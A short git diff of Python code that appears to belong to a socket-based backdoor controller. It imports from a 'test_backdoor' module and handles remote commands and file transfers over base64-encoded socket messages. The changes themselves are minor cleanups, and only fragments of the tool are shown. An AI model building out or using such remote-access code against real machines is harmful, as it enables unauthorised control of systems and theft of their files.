@@ -2,9 +2,7 @@ import socket
 #from test_backdoor import handle_commands
 import base64
 
-from sender import client
-from test_backdoor import handle_commands
-
+#Test Push
 
 def handle_command(client_socket):
     while True:
@@ -32,7 +30,7 @@ def handle_command(client_socket):
 def receive_file(client_socket, filename):
     msg = client_socket.recv(1024)
     if base64.b64decode(msg.decode('utf-8')) == "File not found":
-        handle_commands(client_socket)
+        handle_command(client_socket)
     else:
         with open(filename, 'wb') as file:  # Open the file to save it locally
             while True:
